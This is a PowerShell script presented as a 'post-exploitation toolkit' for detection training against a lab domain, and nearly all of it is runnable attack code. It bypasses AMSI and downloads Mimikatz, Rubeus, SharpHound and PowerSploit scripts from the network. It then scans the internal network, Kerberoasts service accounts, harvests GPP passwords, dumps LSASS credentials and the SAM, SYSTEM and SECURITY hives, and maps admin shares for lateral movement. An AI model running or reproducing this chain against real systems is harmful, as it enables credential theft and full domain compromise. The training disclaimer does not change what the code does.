<#
.SYNOPSIS
    MajorCorp Post-Exploitation Toolkit
    Downloads and executes common Windows attack tools for security training.

.DESCRIPTION
    This script automates the post-exploitation phase of a penetration test,
    including reconnaissance, credential harvesting, and privilege escalation.
    
    Tools included:
    - SharpHound (BloodHound collector)
    - Mimikatz (credential extraction)
    - Rubeus (Kerberos attacks)
    - PowerView (AD enumeration)
    - Seatbelt (host enumeration)

.PARAMETER Phase
    Which attack phase to execute:
    - All: Run complete attack chain
    - Recon: Network and AD reconnaissance only
    - Credentials: Credential harvesting only
    - Escalate: Privilege escalation only
    - Lateral: Lateral movement preparation
    - Report: Generate report only

.PARAMETER OutputPath
    Directory to store results and reports (default: C:\Temp\PostExploit)

.PARAMETER DomainController
    IP or hostname of the Domain Controller (default: auto-detect)

.PARAMETER SkipDownload
    Skip downloading tools (use if already present)

.EXAMPLE
    .\Invoke-PostExploitation.ps1 -Phase All
    
.EXAMPLE
    .\Invoke-PostExploitation.ps1 -Phase Credentials -OutputPath C:\Loot

.NOTES
    Author: Security Training Team
    Purpose: Cortex XDR Detection Training
    WARNING: For authorized security testing only!
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [ValidateSet("All", "Recon", "Credentials", "Escalate", "Lateral", "Report")]
    [string]$Phase = "All",
    
    [Parameter(Mandatory=$false)]
    [string]$OutputPath = "C:\Temp\PostExploit",
    
    [Parameter(Mandatory=$false)]
    [string]$DomainController = "",
    
    [Parameter(Mandatory=$false)]
    [switch]$SkipDownload
)

# =============================================================================
# CONFIGURATION
# =============================================================================

$ErrorActionPreference = "Continue"
$ProgressPreference = "SilentlyContinue"

$ToolsPath = "$OutputPath\Tools"
$ReportPath = "$OutputPath\Reports"
$LootPath = "$OutputPath\Loot"
$LogFile = "$OutputPath\postexploit.log"

# Tool URLs (GitHub releases and trusted sources)
$Tools = @{
    # SharpHound - BloodHound data collector
    SharpHound = "https://github.com/BloodHoundAD/SharpHound/releases/download/v2.3.3/SharpHound-v2.3.3.zip"
    
    # Rubeus - Kerberos attack toolkit
    Rubeus = "https://github.com/GhostPack/Rubeus/releases/download/v2.3.2/Rubeus.exe"
    
    # Seatbelt - Host enumeration
    Seatbelt = "https://github.com/GhostPack/Seatbelt/releases/download/v1.2.2/Seatbelt.exe"
    
    # Certify - AD CS attacks
    Certify = "https://github.com/GhostPack/Certify/releases/download/v1.1.0/Certify.exe"
}

# PowerShell scripts to download
$Scripts = @{
    # PowerView - AD enumeration (from PowerSploit)
    PowerView = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"
    
    # Invoke-Mimikatz - In-memory Mimikatz
    InvokeMimikatz = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"
    
    # PowerUp - Privilege escalation checks
    PowerUp = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"
    
    # Get-GPPPassword - GPP credential extraction
    GetGPPPassword = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1"
}

# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogMessage = "[$Timestamp] [$Level] $Message"
    Write-Host $LogMessage -ForegroundColor $(switch($Level) {
        "ERROR" { "Red" }
        "WARN"  { "Yellow" }
        "SUCCESS" { "Green" }
        default { "White" }
    })
    $LogMessage | Out-File -FilePath $LogFile -Append -ErrorAction SilentlyContinue
}

function Initialize-Environment {
    Write-Log "Initializing post-exploitation environment..."
    
    # Create directories
    @($OutputPath, $ToolsPath, $ReportPath, $LootPath) | ForEach-Object {
        if (-not (Test-Path $_)) {
            New-Item -ItemType Directory -Path $_ -Force | Out-Null
            Write-Log "Created directory: $_"
        }
    }
    
    # Disable AMSI (for training purposes)
    try {
        $a = [Ref].Assembly.GetTypes() | ForEach-Object {
            if ($_.Name -like "*iUtils") { $_ }
        }
        $f = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like "*Context" }
        if ($f) {
            $f.SetValue($null, [IntPtr]::Zero)
            Write-Log "AMSI bypass attempted" "WARN"
        }
    } catch {
        Write-Log "AMSI bypass not applied: $_" "WARN"
    }
    
    # Get domain info
    try {
        $script:Domain = (Get-WmiObject Win32_ComputerSystem).Domain
        $script:ComputerName = $env:COMPUTERNAME
        $script:Username = $env:USERNAME
        
        if ([string]::IsNullOrEmpty($DomainController)) {
            $script:DC = (Resolve-DnsName -Name "_ldap._tcp.dc._msdcs.$Domain" -Type SRV -ErrorAction SilentlyContinue | 
                         Select-Object -First 1).NameTarget
            if (-not $script:DC) {
                $script:DC = "10.0.2.10"  # Default for lab
            }
        } else {
            $script:DC = $DomainController
        }
        
        Write-Log "Domain: $script:Domain"
        Write-Log "Domain Controller: $script:DC"
        Write-Log "Computer: $script:ComputerName"
        Write-Log "User: $script:Username"
    } catch {
        Write-Log "Failed to get domain info: $_" "WARN"
        $script:Domain = "MajorCorp.local"
        $script:DC = "10.0.2.10"
    }
}

function Get-Tools {
    if ($SkipDownload) {
        Write-Log "Skipping tool download (SkipDownload flag set)"
        return
    }
    
    Write-Log "Downloading attack tools..."
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    # Download executables
    foreach ($tool in $Tools.GetEnumerator()) {
        $destPath = "$ToolsPath\$($tool.Key).exe"
        if ($tool.Value -like "*.zip") {
            $destPath = "$ToolsPath\$($tool.Key).zip"
        }
        
        try {
            Write-Log "Downloading $($tool.Key)..."
            Invoke-WebRequest -Uri $tool.Value -OutFile $destPath -UseBasicParsing -ErrorAction Stop
            
            # Extract if zip
            if ($destPath -like "*.zip") {
                Expand-Archive -Path $destPath -DestinationPath "$ToolsPath\$($tool.Key)" -Force
                Remove-Item $destPath -Force
                Write-Log "$($tool.Key) extracted" "SUCCESS"
            } else {
                Write-Log "$($tool.Key) downloaded" "SUCCESS"
            }
        } catch {
            Write-Log "Failed to download $($tool.Key): $_" "ERROR"
        }
    }
    
    # Download PowerShell scripts
    foreach ($script in $Scripts.GetEnumerator()) {
        $destPath = "$ToolsPath\$($script.Key).ps1"
        try {
            Write-Log "Downloading $($script.Key).ps1..."
            Invoke-WebRequest -Uri $script.Value -OutFile $destPath -UseBasicParsing -ErrorAction Stop
            Write-Log "$($script.Key).ps1 downloaded" "SUCCESS"
        } catch {
            Write-Log "Failed to download $($script.Key): $_" "ERROR"
        }
    }
}

# =============================================================================
# PHASE 1: RECONNAISSANCE
# =============================================================================

function Invoke-Reconnaissance {
    Write-Log "========== PHASE 1: RECONNAISSANCE ==========" "SUCCESS"
    
    $ReconReport = @{
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Phase = "Reconnaissance"
        Results = @{}
    }
    
    # 1.1 Local System Enumeration
    Write-Log "Enumerating local system..."
    $ReconReport.Results.LocalSystem = @{
        Hostname = $env:COMPUTERNAME
        Username = $env:USERNAME
        Domain = $env:USERDOMAIN
        OS = (Get-WmiObject Win32_OperatingSystem).Caption
        Architecture = $env:PROCESSOR_ARCHITECTURE
        IPAddresses = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127.*" }).IPAddress
        LoggedOnUsers = (Get-WmiObject Win32_LoggedOnUser | Select-Object -ExpandProperty Antecedent | 
                        ForEach-Object { $_.Split('"')[1] + "\" + $_.Split('"')[3] } | Select-Object -Unique)
    }
    
    # 1.2 Network Enumeration
    Write-Log "Scanning internal network..."
    $NetworkTargets = @()
    $InternalSubnet = "10.0.2"
    
    1..254 | ForEach-Object {
        $ip = "$InternalSubnet.$_"
        $ping = Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue
        if ($ping) {
            $NetworkTargets += @{
                IP = $ip
                Alive = $true
                Ports = @()
            }
        }
    }
    
    # Port scan alive hosts
    $CommonPorts = @(22, 80, 88, 135, 139, 389, 443, 445, 636, 3268, 3269, 3389, 5985, 5986)
    foreach ($target in $NetworkTargets) {
        foreach ($port in $CommonPorts) {
            $socket = New-Object System.Net.Sockets.TcpClient
            try {
                $result = $socket.BeginConnect($target.IP, $port, $null, $null)
                $wait = $result.AsyncWaitHandle.WaitOne(100, $false)
                if ($wait -and $socket.Connected) {
                    $target.Ports += $port
                }
            } catch { }
            $socket.Close()
        }
        if ($target.Ports.Count -gt 0) {
            Write-Log "  $($target.IP): Ports $($target.Ports -join ', ')"
        }
    }
    $ReconReport.Results.NetworkScan = $NetworkTargets
    
    # 1.3 Domain Enumeration
    Write-Log "Enumerating Active Directory..."
    try {
        $Searcher = New-Object DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = "LDAP://$script:DC"
        
        # Get domain info
        $Searcher.Filter = "(objectClass=domain)"
        $DomainInfo = $Searcher.FindOne()
        $ReconReport.Results.DomainInfo = @{
            DistinguishedName = $DomainInfo.Properties["distinguishedname"][0]
            FunctionalLevel = $DomainInfo.Properties["msds-behavior-version"][0]
        }
        
        # Get Domain Controllers
        $Searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
        $DCs = $Searcher.FindAll()
        $ReconReport.Results.DomainControllers = @($DCs | ForEach-Object { $_.Properties["dnshostname"][0] })
        Write-Log "  Found $($DCs.Count) Domain Controller(s)"
        
        # Get all users
        $Searcher.Filter = "(&(objectCategory=person)(objectClass=user))"
        $Users = $Searcher.FindAll()
        $ReconReport.Results.Users = @($Users | ForEach-Object {
            @{
                SamAccountName = $_.Properties["samaccountname"][0]
                Description = $_.Properties["description"][0]
                LastLogon = $_.Properties["lastlogon"][0]
                AdminCount = $_.Properties["admincount"][0]
            }
        })
        Write-Log "  Found $($Users.Count) user(s)"
        
        # Get Domain Admins
        $Searcher.Filter = "(&(objectCategory=group)(cn=Domain Admins))"
        $DAGroup = $Searcher.FindOne()
        $ReconReport.Results.DomainAdmins = @($DAGroup.Properties["member"] | ForEach-Object { $_.Split(',')[0].Replace('CN=','') })
        Write-Log "  Domain Admins: $($ReconReport.Results.DomainAdmins -join ', ')"
        
        # Get computers
        $Searcher.Filter = "(objectCategory=computer)"
        $Computers = $Searcher.FindAll()
        $ReconReport.Results.Computers = @($Computers | ForEach-Object {
            @{
                Name = $_.Properties["name"][0]
                DNSHostname = $_.Properties["dnshostname"][0]
                OperatingSystem = $_.Properties["operatingsystem"][0]
            }
        })
        Write-Log "  Found $($Computers.Count) computer(s)"
        
    } catch {
        Write-Log "AD enumeration error: $_" "ERROR"
    }
    
    # 1.4 Run SharpHound if available
    $SharpHoundPath = Get-ChildItem "$ToolsPath\SharpHound" -Filter "SharpHound.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($SharpHoundPath) {
        Write-Log "Running SharpHound collector..."
        try {
            $bhOutput = & $SharpHoundPath.FullName -c All --outputdirectory $LootPath --zipfilename "bloodhound_$($env:COMPUTERNAME).zip" 2>&1
            Write-Log "SharpHound collection complete" "SUCCESS"
            $ReconReport.Results.BloodHoundZip = "$LootPath\bloodhound_$($env:COMPUTERNAME).zip"
        } catch {
            Write-Log "SharpHound error: $_" "ERROR"
        }
    }
    
    # Save recon report
    $ReconReport | ConvertTo-Json -Depth 10 | Out-File "$ReportPath\01_Reconnaissance.json"
    Write-Log "Reconnaissance report saved to $ReportPath\01_Reconnaissance.json" "SUCCESS"
    
    return $ReconReport
}

# =============================================================================
# PHASE 2: CREDENTIAL HARVESTING
# =============================================================================

function Invoke-CredentialHarvesting {
    Write-Log "========== PHASE 2: CREDENTIAL HARVESTING ==========" "SUCCESS"
    
    $CredReport = @{
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Phase = "Credential Harvesting"
        Results = @{}
    }
    
    # 2.1 Kerberoasting
    Write-Log "Performing Kerberoasting attack..."
    try {
        $Searcher = New-Object DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = "LDAP://$script:DC"
        $Searcher.Filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
        $SPNUsers = $Searcher.FindAll()
        
        $KerberoastResults = @()
        foreach ($user in $SPNUsers) {
            $username = $user.Properties["samaccountname"][0]
            $spns = $user.Properties["serviceprincipalname"]
            
            Write-Log "  Found SPN user: $username"
            
            foreach ($spn in $spns) {
                try {
                    # Request TGS ticket
                    Add-Type -AssemblyName System.IdentityModel
                    $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
                    $ticketBytes = $ticket.GetRequest()
                    $ticketHex = [System.BitConverter]::ToString($ticketBytes) -replace '-'
                    
                    # Extract hash (simplified - real extraction is more complex)
                    $KerberoastResults += @{
                        Username = $username
                        SPN = $spn
                        TicketLength = $ticketBytes.Length
                        HashExtracted = $true
                    }
                    Write-Log "    TGS ticket obtained for SPN: $spn" "SUCCESS"
                } catch {
                    Write-Log "    Failed to get ticket for $spn : $_" "WARN"
                }
            }
        }
        $CredReport.Results.Kerberoasting = $KerberoastResults
        Write-Log "Kerberoasting complete: $($KerberoastResults.Count) tickets obtained"
        
    } catch {
        Write-Log "Kerberoasting error: $_" "ERROR"
    }
    
    # 2.2 AS-REP Roasting
    Write-Log "Checking for AS-REP Roastable accounts..."
    try {
        $Searcher.Filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
        $ASREPUsers = $Searcher.FindAll()
        
        $ASREPResults = @()
        foreach ($user in $ASREPUsers) {
            $username = $user.Properties["samaccountname"][0]
            Write-Log "  AS-REP Roastable: $username" "SUCCESS"
            $ASREPResults += @{
                Username = $username
                Vulnerable = $true
            }
        }
        $CredReport.Results.ASREPRoasting = $ASREPResults
        
    } catch {
        Write-Log "AS-REP Roasting error: $_" "ERROR"
    }
    
    # 2.3 GPP Passwords
    Write-Log "Searching for GPP credentials in SYSVOL..."
    try {
        $SYSVOLPath = "\\$script:DC\SYSVOL\$script:Domain"
        $GPPFiles = Get-ChildItem -Path $SYSVOLPath -Recurse -Include "Groups.xml", "Services.xml", "Scheduledtasks.xml", "DataSources.xml", "Printers.xml", "Drives.xml" -ErrorAction SilentlyContinue
        
        $GPPResults = @()
        foreach ($file in $GPPFiles) {
            $content = Get-Content $file.FullName -Raw
            if ($content -match 'cpassword="([^"]+)"') {
                Write-Log "  Found cpassword in: $($file.FullName)" "SUCCESS"
                $GPPResults += @{
                    File = $file.FullName
                    EncryptedPassword = $Matches[1]
                }
            }
        }
        $CredReport.Results.GPPPasswords = $GPPResults
        
    } catch {
        Write-Log "GPP search error: $_" "ERROR"
    }
    
    # 2.4 LSASS Dump (requires admin)
    Write-Log "Attempting LSASS credential extraction..."
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if ($isAdmin) {
        # Try Invoke-Mimikatz if available
        $MimikatzPath = "$ToolsPath\InvokeMimikatz.ps1"
        if (Test-Path $MimikatzPath) {
            try {
                Write-Log "Loading Invoke-Mimikatz..."
                . $MimikatzPath
                $mimikatzOutput = Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
                $mimikatzOutput | Out-File "$LootPath\mimikatz_output.txt"
                $CredReport.Results.MimikatzOutput = "$LootPath\mimikatz_output.txt"
                Write-Log "Mimikatz output saved" "SUCCESS"
            } catch {
                Write-Log "Mimikatz error: $_" "ERROR"
            }
        }
        
        # Dump SAM/SYSTEM hives
        try {
            Write-Log "Dumping SAM and SYSTEM hives..."
            reg save HKLM\SAM "$LootPath\SAM" /y 2>&1 | Out-Null
            reg save HKLM\SYSTEM "$LootPath\SYSTEM" /y 2>&1 | Out-Null
            reg save HKLM\SECURITY "$LootPath\SECURITY" /y 2>&1 | Out-Null
            Write-Log "Registry hives saved to $LootPath" "SUCCESS"
            $CredReport.Results.RegistryDump = @("$LootPath\SAM", "$LootPath\SYSTEM", "$LootPath\SECURITY")
        } catch {
            Write-Log "Registry dump error: $_" "ERROR"
        }
    } else {
        Write-Log "Not running as admin - skipping LSASS and registry dump" "WARN"
    }
    
    # Save credential report
    $CredReport | ConvertTo-Json -Depth 10 | Out-File "$ReportPath\02_Credentials.json"
    Write-Log "Credential report saved to $ReportPath\02_Credentials.json" "SUCCESS"
    
    return $CredReport
}

# =============================================================================
# PHASE 3: PRIVILEGE ESCALATION
# =============================================================================

function Invoke-PrivilegeEscalation {
    Write-Log "========== PHASE 3: PRIVILEGE ESCALATION ==========" "SUCCESS"
    
    $PrivEscReport = @{
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Phase = "Privilege Escalation"
        Results = @{}
    }
    
    # 3.1 Check current privileges
    Write-Log "Checking current privileges..."
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    $PrivEscReport.Results.CurrentUser = @{
        Username = $identity.Name
        IsAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        IsSystem = $identity.IsSystem
        Groups = @($identity.Groups | ForEach-Object { $_.Translate([Security.Principal.NTAccount]).Value })
    }
    
    # 3.2 AlwaysInstallElevated check
    Write-Log "Checking AlwaysInstallElevated..."
    try {
        $hklm = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
        $hkcu = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
        
        if ($hklm -eq 1 -and $hkcu -eq 1) {
            Write-Log "  AlwaysInstallElevated is ENABLED - vulnerable!" "SUCCESS"
            $PrivEscReport.Results.AlwaysInstallElevated = @{ Vulnerable = $true; HKLM = $hklm; HKCU = $hkcu }
        } else {
            $PrivEscReport.Results.AlwaysInstallElevated = @{ Vulnerable = $false }
        }
    } catch {
        $PrivEscReport.Results.AlwaysInstallElevated = @{ Vulnerable = $false; Error = $_.ToString() }
    }
    
    # 3.3 Unquoted service paths
    Write-Log "Checking unquoted service paths..."
    $UnquotedServices = @()
    Get-WmiObject Win32_Service | Where-Object {
        $_.PathName -notlike '"*' -and 
        $_.PathName -like '* *' -and
        $_.PathName -notlike 'C:\Windows\*'
    } | ForEach-Object {
        Write-Log "  Unquoted path: $($_.Name) - $($_.PathName)" "SUCCESS"
        $UnquotedServices += @{
            Name = $_.Name
            PathName = $_.PathName
            StartMode = $_.StartMode
            State = $_.State
        }
    }
    $PrivEscReport.Results.UnquotedServicePaths = $UnquotedServices
    
    # 3.4 Writable service binaries
    Write-Log "Checking writable service binaries..."
    $WritableServices = @()
    Get-WmiObject Win32_Service | ForEach-Object {
        $path = $_.PathName -replace '"', '' -split ' ' | Select-Object -First 1
        if (Test-Path $path -ErrorAction SilentlyContinue) {
            try {
                $acl = Get-Acl $path
                $access = $acl.Access | Where-Object {
                    $_.IdentityReference -match "Users|Everyone|Authenticated Users" -and
                    $_.FileSystemRights -match "Write|FullControl|Modify"
                }
                if ($access) {
                    Write-Log "  Writable service binary: $path" "SUCCESS"
                    $WritableServices += @{
                        Name = $_.Name
                        Path = $path
                        WritableBy = @($access.IdentityReference)
                    }
                }
            } catch { }
        }
    }
    $PrivEscReport.Results.WritableServices = $WritableServices
    
    # 3.5 Scheduled task permissions
    Write-Log "Checking scheduled task vulnerabilities..."
    $VulnTasks = @()
    Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq "SYSTEM" } | ForEach-Object {
        $task = $_
        foreach ($action in $task.Actions) {
            if ($action.Execute -and (Test-Path $action.Execute -ErrorAction SilentlyContinue)) {
                try {
                    $acl = Get-Acl $action.Execute
                    $access = $acl.Access | Where-Object {
                        $_.IdentityReference -match "Users|Everyone" -and
                        $_.FileSystemRights -match "Write|FullControl"
                    }
                    if ($access) {
                        Write-Log "  Vulnerable scheduled task: $($task.TaskName)" "SUCCESS"
                        $VulnTasks += @{
                            TaskName = $task.TaskName
                            Execute = $action.Execute
                            RunAs = $task.Principal.UserId
                        }
                    }
                } catch { }
            }
        }
    }
    $PrivEscReport.Results.VulnerableScheduledTasks = $VulnTasks
    
    # 3.6 Run Seatbelt if available
    $SeatbeltPath = "$ToolsPath\Seatbelt.exe"
    if (Test-Path $SeatbeltPath) {
        Write-Log "Running Seatbelt enumeration..."
        try {
            $seatbeltOutput = & $SeatbeltPath -group=all -outputfile="$ReportPath\seatbelt_output.txt" 2>&1
            Write-Log "Seatbelt output saved" "SUCCESS"
            $PrivEscReport.Results.SeatbeltReport = "$ReportPath\seatbelt_output.txt"
        } catch {
            Write-Log "Seatbelt error: $_" "ERROR"
        }
    }
    
    # Save privilege escalation report
    $PrivEscReport | ConvertTo-Json -Depth 10 | Out-File "$ReportPath\03_PrivilegeEscalation.json"
    Write-Log "Privilege escalation report saved" "SUCCESS"
    
    return $PrivEscReport
}

# =============================================================================
# PHASE 4: LATERAL MOVEMENT PREPARATION
# =============================================================================

function Invoke-LateralMovementPrep {
    Write-Log "========== PHASE 4: LATERAL MOVEMENT ==========" "SUCCESS"
    
    $LateralReport = @{
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Phase = "Lateral Movement"
        Results = @{}
    }
    
    # 4.1 Find admin access on other machines
    Write-Log "Checking admin access on domain computers..."
    $AdminAccess = @()
    
    try {
        $Searcher = New-Object DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = "LDAP://$script:DC"
        $Searcher.Filter = "(objectCategory=computer)"
        $Computers = $Searcher.FindAll()
        
        foreach ($computer in $Computers) {
            $hostname = $computer.Properties["dnshostname"][0]
            if ($hostname -and $hostname -ne $env:COMPUTERNAME) {
                try {
                    $share = "\\$hostname\C$"
                    $canAccess = Test-Path $share -ErrorAction SilentlyContinue
                    if ($canAccess) {
                        Write-Log "  Admin access on: $hostname" "SUCCESS"
                        $AdminAccess += @{
                            Hostname = $hostname
                            AdminShare = $true
                            Method = "SMB Admin Share"
                        }
                    }
                } catch { }
            }
        }
    } catch {
        Write-Log "Admin access check error: $_" "ERROR"
    }
    $LateralReport.Results.AdminAccess = $AdminAccess
    
    # 4.2 Check for unconstrained delegation
    Write-Log "Checking for unconstrained delegation..."
    try {
        $Searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
        $UnconstrainedDelegation = $Searcher.FindAll()
        
        $DelegationResults = @()
        foreach ($computer in $UnconstrainedDelegation) {
            $name = $computer.Properties["dnshostname"][0]
            Write-Log "  Unconstrained delegation: $name" "SUCCESS"
            $DelegationResults += @{
                Hostname = $name
                Type = "Unconstrained"
            }
        }
        $LateralReport.Results.UnconstrainedDelegation = $DelegationResults
    } catch {
        Write-Log "Delegation check error: $_" "ERROR"
    }
    
    # 4.3 Active sessions enumeration
    Write-Log "Enumerating active sessions..."
    $ActiveSessions = @()
    foreach ($target in $AdminAccess) {
        try {
            $sessions = Get-WmiObject -Class Win32_LoggedOnUser -ComputerName $target.Hostname -ErrorAction SilentlyContinue
            $uniqueSessions = $sessions | Select-Object -ExpandProperty Antecedent -Unique
            foreach ($session in $uniqueSessions) {
                if ($session -match 'Domain="([^"]+)".*Name="([^"]+)"') {
                    $ActiveSessions += @{
                        Computer = $target.Hostname
                        Domain = $Matches[1]
                        User = $Matches[2]
                    }
                }
            }
        } catch { }
    }
    $LateralReport.Results.ActiveSessions = $ActiveSessions
    
    # 4.4 Generate attack recommendations
    Write-Log "Generating lateral movement recommendations..."
    $Recommendations = @()
    
    foreach ($target in $AdminAccess) {
        $Recommendations += @{
            Target = $target.Hostname
            Methods = @(
                "psexec.py $script:Domain/user@$($target.Hostname)",
                "evil-winrm -i $($target.Hostname) -u user -p password",
                "Enter-PSSession -ComputerName $($target.Hostname) -Credential \$cred"
            )
        }
    }
    $LateralReport.Results.Recommendations = $Recommendations
    
    # Save lateral movement report
    $LateralReport | ConvertTo-Json -Depth 10 | Out-File "$ReportPath\04_LateralMovement.json"
    Write-Log "Lateral movement report saved" "SUCCESS"
    
    return $LateralReport
}

# =============================================================================
# FINAL REPORT GENERATION
# =============================================================================

function New-FinalReport {
    Write-Log "========== GENERATING FINAL REPORT ==========" "SUCCESS"
    
    $FinalReport = @"
================================================================================
                    MAJORCORP POST-EXPLOITATION REPORT
================================================================================
Generated: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Attacker: $env:USERDOMAIN\$env:USERNAME
Target Domain: $script:Domain
Domain Controller: $script:DC

================================================================================
                           EXECUTIVE SUMMARY
================================================================================

"@

    # Load individual reports
    $ReconData = if (Test-Path "$ReportPath\01_Reconnaissance.json") { Get-Content "$ReportPath\01_Reconnaissance.json" | ConvertFrom-Json } else { $null }
    $CredData = if (Test-Path "$ReportPath\02_Credentials.json") { Get-Content "$ReportPath\02_Credentials.json" | ConvertFrom-Json } else { $null }
    $PrivEscData = if (Test-Path "$ReportPath\03_PrivilegeEscalation.json") { Get-Content "$ReportPath\03_PrivilegeEscalation.json" | ConvertFrom-Json } else { $null }
    $LateralData = if (Test-Path "$ReportPath\04_LateralMovement.json") { Get-Content "$ReportPath\04_LateralMovement.json" | ConvertFrom-Json } else { $null }

    # Add reconnaissance summary
    if ($ReconData) {
        $FinalReport += @"

[RECONNAISSANCE]
- Users Found: $($ReconData.Results.Users.Count)
- Computers Found: $($ReconData.Results.Computers.Count)
- Domain Admins: $($ReconData.Results.DomainAdmins -join ', ')
- Network Targets: $($ReconData.Results.NetworkScan.Count) hosts alive

"@
    }
    
    # Add credential summary
    if ($CredData) {
        $FinalReport += @"

[CREDENTIAL HARVESTING]
- Kerberoastable Accounts: $($CredData.Results.Kerberoasting.Count)
- AS-REP Roastable Accounts: $($CredData.Results.ASREPRoasting.Count)
- GPP Passwords Found: $($CredData.Results.GPPPasswords.Count)

"@
    }
    
    # Add privilege escalation summary
    if ($PrivEscData) {
        $FinalReport += @"

[PRIVILEGE ESCALATION]
- AlwaysInstallElevated: $(if($PrivEscData.Results.AlwaysInstallElevated.Vulnerable){"VULNERABLE"}else{"Not vulnerable"})
- Unquoted Service Paths: $($PrivEscData.Results.UnquotedServicePaths.Count)
- Writable Services: $($PrivEscData.Results.WritableServices.Count)
- Vulnerable Scheduled Tasks: $($PrivEscData.Results.VulnerableScheduledTasks.Count)

"@
    }
    
    # Add lateral movement summary
    if ($LateralData) {
        $FinalReport += @"

[LATERAL MOVEMENT]
- Admin Access to: $($LateralData.Results.AdminAccess.Count) systems
- Unconstrained Delegation: $($LateralData.Results.UnconstrainedDelegation.Count) systems
- Active Sessions Found: $($LateralData.Results.ActiveSessions.Count)

"@
    }
    
    $FinalReport += @"

================================================================================
                        COLLECTED ARTIFACTS
================================================================================
Output Directory: $OutputPath
- Reports: $ReportPath
- Loot: $LootPath
- Tools: $ToolsPath

================================================================================
                        DETECTION SIGNATURES
================================================================================
This attack would generate the following Cortex XDR alerts:
- BloodHound/SharpHound LDAP enumeration
- Kerberoasting (TGS requests for service accounts)
- LSASS memory access (credential dumping)
- Pass-the-Hash authentication
- Lateral movement via SMB/WinRM
- Registry hive access (SAM/SYSTEM)

================================================================================
                              END REPORT
================================================================================
"@

    $FinalReport | Out-File "$ReportPath\FINAL_REPORT.txt"
    Write-Log "Final report saved to $ReportPath\FINAL_REPORT.txt" "SUCCESS"
    
    # Display report
    Write-Host "`n$FinalReport" -ForegroundColor Cyan
    
    return $FinalReport
}

# =============================================================================
# MAIN EXECUTION
# =============================================================================

Write-Host @"

███╗   ███╗ █████╗      ██╗ ██████╗ ██████╗  ██████╗ ██████╗ ██████╗ ██████╗ 
████╗ ████║██╔══██╗     ██║██╔═══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔══██╗
██╔████╔██║███████║     ██║██║   ██║██████╔╝██║     ██║   ██║██████╔╝██████╔╝
██║╚██╔╝██║██╔══██║██   ██║██║   ██║██╔══██╗██║     ██║   ██║██╔══██╗██╔═══╝ 
██║ ╚═╝ ██║██║  ██║╚█████╔╝╚██████╔╝██║  ██║╚██████╗╚██████╔╝██║  ██║██║     
╚═╝     ╚═╝╚═╝  ╚═╝ ╚════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     
                                                                              
              POST-EXPLOITATION TOOLKIT - FOR TRAINING ONLY
                   
"@ -ForegroundColor Red

Write-Host "[!] WARNING: This tool is for authorized security testing only!" -ForegroundColor Yellow
Write-Host "[*] Phase: $Phase" -ForegroundColor Cyan
Write-Host "[*] Output: $OutputPath" -ForegroundColor Cyan
Write-Host ""

# Initialize
Initialize-Environment

# Download tools
Get-Tools

# Execute phases
switch ($Phase) {
    "All" {
        Invoke-Reconnaissance
        Invoke-CredentialHarvesting
        Invoke-PrivilegeEscalation
        Invoke-LateralMovementPrep
        New-FinalReport
    }
    "Recon" {
        Invoke-Reconnaissance
    }
    "Credentials" {
        Invoke-CredentialHarvesting
    }
    "Escalate" {
        Invoke-PrivilegeEscalation
    }
    "Lateral" {
        Invoke-LateralMovementPrep
    }
    "Report" {
        New-FinalReport
    }
}

Write-Log "Post-exploitation complete!" "SUCCESS"
Write-Host "`n[*] Results saved to: $OutputPath" -ForegroundColor Green
